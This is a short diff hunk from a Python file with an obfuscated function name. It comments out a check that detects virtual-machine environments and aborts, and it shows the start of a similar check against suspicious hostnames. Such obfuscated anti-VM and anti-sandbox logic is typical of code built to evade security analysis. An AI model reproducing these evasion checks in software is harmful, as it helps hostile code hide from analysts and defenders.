@@ -71,8 +71,8 @@ def lOIl0IIl0OIl00o0OlI1():
     ]
     system_info = (platform.system() + platform.machine() + 
                   platform.processor() + platform.platform()).lower()
-    if any(sig in system_info for sig in vm_signatures):
-        raise RuntimeError("VM environment detected")
+    #if any(sig in system_info for sig in vm_signatures):
+    #    raise RuntimeError("VM environment detected")
     try:
         hostname = socket.gethostname().lower()
         suspicious_hostnames = vm_signatures + [
